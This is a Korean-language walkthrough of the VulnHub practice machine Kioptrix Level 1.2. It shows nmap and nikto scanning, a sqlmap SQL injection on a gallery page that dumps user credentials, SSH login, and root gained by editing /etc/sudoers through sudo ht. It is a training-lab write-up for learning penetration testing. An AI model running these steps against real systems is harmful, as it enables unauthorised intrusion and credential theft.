[Kioptrix : Level 1.2](https://www.vulnhub.com/entry/kioptrix-level-12-3,24/)
# 아래에 있는 kioptrix3 링크는 가상환경이 실행되고있는 곳에서만 들어가 주시기 바랍니다.
# targetdiscovery
***
### nmap -sn 192.168.25.8-255 --open   
![1](https://user-images.githubusercontent.com/69203345/108983274-068c4d80-76d2-11eb-8bf4-95d2d7a57f00.PNG)
/etc/hosts 파일에 ip 넣어놓기   

# enumerate + exploitation
***
## target: 192.168.25.18
### nmap -O -sV -sS -p- 192.168.25.18    
![2](https://user-images.githubusercontent.com/69203345/108983568-59fe9b80-76d2-11eb-9150-fdecd8631513.PNG)   
22,80/tcp 있으니까 웹 페이지에 들어가봄   
![3](https://user-images.githubusercontent.com/69203345/108985811-d1352f00-76d4-11eb-81f6-a1c348b5a54c.PNG)     
sql injection 시도했는데 실패 했었음...   
### nikto -h http://kioptrix3.com   
![4](https://user-images.githubusercontent.com/69203345/108986048-122d4380-76d5-11eb-84ea-6143f2e112f5.PNG)   
/phpmyadmin/ 경로를 찾음 그래서 들어가봄     
![5](https://user-images.githubusercontent.com/69203345/108986356-5f111a00-76d5-11eb-8c54-197f56069f14.PNG)   
admin으로 로그인은 되지만 난 여기서 뭘 할수있는지 모르겠음   
### http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos 에서 작은 따옴표를 추가하면 오류가 생김
그래서 sqlmap 으로 뒤져보기로 함
#### sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" --dbs 
했을때 database 3개를 볼수 있었다   
![6](https://user-images.githubusercontent.com/69203345/109000286-d9966580-76e6-11eb-8755-29e31ada5006.PNG)   
information_schema 에선 쓸만한걸 찾을수 없었다    
#### sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" -D gallery --tables
gallery database 에 있는 table을 찾아보자   
![7](https://user-images.githubusercontent.com/69203345/109001070-d059c880-76e7-11eb-9eee-181cbed87992.PNG)   
쓸만한걸 찾은거 같기도..?   
#### sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" -D gallery -T gallarific_users --dump
gallarific_users 에서 admin n0t7t1k4 를 찾았다    
![8](https://user-images.githubusercontent.com/69203345/109001424-48c08980-76e8-11eb-98fa-3bb54a56fb3e.PNG)    
#### sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" -D gallery -T dev_accounts --dump
다른 아이디와 비밀번호들을 찾았다    
![9](https://user-images.githubusercontent.com/69203345/109001633-83c2bd00-76e8-11eb-8f90-91e08ac5c4d3.PNG)   
로그인 페이지로 이동해서 하나씩 해봤는데 안된다    
그럼 ssh를 이용해서 로그인을 해보자    

# privilege escalation 
***   
### ssh loneferret@kioptrix3.com
![11](https://user-images.githubusercontent.com/69203345/109003624-051b4f00-76eb-11eb-863e-c30ab0bec171.PNG)    
sudo ht를 이용하라고 한다     
### sudo ht
xterm-256color 가 뜨며 안된다 구글링해서 찾아보면 export TERM=xterm 을 치니 해결됐다     
sudo 를 사용할수 있는 유저를 보기 위해선 ht에 들아가 /etc/sudoers 를 들어가면 된다    
/bin/sh 를 추가 해주도록 하자    
![12](https://user-images.githubusercontent.com/69203345/109004546-38121280-76ec-11eb-81ac-a48861d8e14c.PNG)   
저장후 나가서 sudo /bin/sh 를 실행하면 root권한을 획득한것을 볼수 있다    



root획득   
꼭 이방법만 있는것은 아니다.
